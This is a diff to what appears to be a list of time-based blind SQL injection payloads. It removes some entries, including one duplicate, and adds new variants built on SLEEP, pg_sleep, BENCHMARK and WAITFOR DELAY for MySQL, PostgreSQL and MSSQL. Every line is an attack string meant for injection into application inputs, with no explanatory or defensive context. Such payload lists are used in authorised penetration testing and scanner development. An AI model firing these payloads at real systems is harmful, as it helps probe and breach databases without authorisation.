@@ -19,7 +19,6 @@
 ') || pg_sleep(10)--
 ')) || pg_sleep(10)--
 ') AND (SELECT 1 FROM pg_sleep(10))=1--
-'||(SELECT pg_sleep(10))--
 "||pg_sleep(10)--
 1; SELECT pg_sleep(10)--
 0; SELECT pg_sleep(10)--
@@ -78,7 +77,6 @@ test%') OR SLEEP(10)--
 1 WAITFOR DELAY '0:0:10'--
 ') WAITFOR DELAY '0:0:10'--
 ')); WAITFOR DELAY '0:0:10'--
-')); WAITFOR DELAY '0:0:10'--
 ')) AND 1=1; WAITFOR DELAY '0:0:10'--
 '); WAITFOR DELAY '0:0:10'--
 " WAITFOR DELAY '0:0:10'--
@@ -114,10 +112,16 @@ test%') OR SLEEP(10)--
 '%0d%0aAND%0d%0aSLEEP(10)--
 '%27%20OR%20SLEEP(10)--
 '%27%20AND%20(SELECT%20SLEEP(10))--
-' OR (SELECT * FROM (SELECT(SLEEP(10)))a)--
-' AND (SELECT * FROM (SELECT(pg_sleep(10)))a)--
-' OR (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(10))--
-' AND (SELECT COUNT(*) FROM information_schema.tables WHERE pg_sleep(10))--
+' OR (SELECT BENCHMARK(10000000,MD5(1)))--
+' AND (SELECT BENCHMARK(10000000,MD5(1)))--
+' OR (SELECT pg_sleep(10) FROM pg_stat_activity LIMIT 1)--
+' AND (SELECT pg_sleep(10) FROM pg_stat_activity LIMIT 1)--
+' OR (SELECT SLEEP(10) FROM information_schema.columns LIMIT 1)--
+' AND (SELECT SLEEP(10) FROM information_schema.columns LIMIT 1)--
+' OR (SELECT pg_sleep(10) FROM generate_series(1,1))--
+' AND (SELECT pg_sleep(10) FROM generate_series(1,1))--
+' OR (SELECT SLEEP(10) FROM dual)--
+' AND (SELECT SLEEP(10) FROM dual)--
 ' OR SLEEP(10)# 
 ' AND SLEEP(10)# 
 ' OR SLEEP(10)-- -
